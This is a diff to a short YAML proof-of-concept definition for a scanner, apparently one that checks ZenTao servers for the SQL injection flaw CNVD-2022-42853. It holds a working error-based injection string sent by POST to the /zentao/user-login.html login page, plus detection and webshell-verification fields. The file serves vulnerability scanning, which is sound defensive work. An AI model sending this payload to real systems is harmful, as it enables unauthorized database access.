@@ -2,17 +2,13 @@
 - name:
   - name: "CNVD-2022-42853"
 
-#种类：poc对应的是scanapy
-- type:
-  - type: "poc"
-
 #请求方式
 - method:
   - method: "post"
 
 #payload
 - payload:
-  - account: "admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"
+  - payload: "account=admin' and (select extractvalue(1,concat(0x7e,(MD5(007)),0x7e)))#"
 
 #response包里的关键字
 - word:
@@ -22,3 +18,11 @@
 #漏洞的位置
 - url:
   - url : "/zentao/user-login.html"
+
+#验证是否攻击成功的 请求方式
+- method-V:
+  - method: "isNone"
+
+#webshell位置
+- verify:
+  - verify : "isNone"
